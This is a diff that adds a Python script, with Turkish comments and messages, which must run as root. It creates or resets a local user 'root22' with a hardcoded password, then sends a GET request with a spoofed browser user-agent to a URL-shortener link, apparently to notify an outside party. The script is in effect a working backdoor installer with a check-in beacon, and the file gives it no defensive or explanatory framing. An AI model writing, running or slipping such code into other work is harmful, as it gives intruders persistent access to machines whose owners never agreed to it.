@@ -1,0 +1,78 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import subprocess
+import pwd
+import requests
+from requests.exceptions import RequestException
+
+# --- Ayarlar ---
+USERNAME = "root22"
+PASSWORD = "Testerbros1"
+URL = "https://yip.su/2Pz4D5"
+
+def check_root():
+    """Betiğin root olarak çalıştırıldığını doğrular."""
+    if os.geteuid() != 0:
+        print("HATA: Bu betik root yetkisi gerektirir. Lütfen 'sudo' ile çalıştırın.", file=sys.stderr)
+        sys.exit(1)
+
+def ensure_user():
+    """root22 kullanıcısını oluşturur veya parolasını günceller."""
+    try:
+        # Kullanıcı var mı?
+        pwd.getpwnam(USERNAME)
+        # Varsa parolayı güncelle
+        result = subprocess.run(
+            ["chpasswd"],
+            input=f"{USERNAME}:{PASSWORD}",
+            text=True,
+            capture_output=True
+        )
+        if result.returncode != 0:
+            raise subprocess.CalledProcessError(result.returncode, result.args, result.stderr)
+        print(f"[OK] '{USERNAME}' kullanıcısının parolası güncellendi.")
+    except KeyError:
+        # Kullanıcı yoksa oluştur
+        try:
+            subprocess.run(["useradd", "-m", USERNAME], check=True, capture_output=True, text=True)
+            result = subprocess.run(
+                ["chpasswd"],
+                input=f"{USERNAME}:{PASSWORD}",
+                text=True,
+                capture_output=True
+            )
+            if result.returncode != 0:
+                raise subprocess.CalledProcessError(result.returncode, result.args, result.stderr)
+            print(f"[OK] '{USERNAME}' kullanıcısı oluşturuldu ve parolası ayarlandı.")
+        except subprocess.CalledProcessError as e:
+            print(f"HATA: Kullanıcı oluşturulamadı: {e.stderr}", file=sys.stderr)
+            sys.exit(1)
+    except subprocess.CalledProcessError as e:
+        print(f"HATA: Parola güncellenemedi: {e.stderr}", file=sys.stderr)
+        sys.exit(1)
+
+def visit_url():
+    """Belirtilen URL'ye bir kez GET isteği gönderir."""
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    }
+    try:
+        response = requests.get(URL, headers=headers, timeout=15)
+        response.raise_for_status()
+        print(f"[OK] '{URL}' başarıyla ziyaret edildi. HTTP durum kodu: {response.status_code}")
+    except RequestException as e:
+        print(f"HATA: '{URL}' ziyaret edilemedi: {e}", file=sys.stderr)
+        sys.exit(1)
+
+def main():
+    check_root()
+    ensure_user()
+    visit_url()
+    print("Tüm işlemler başarıyla tamamlandı.")
+
+if __name__ == "__main__":
+    main()
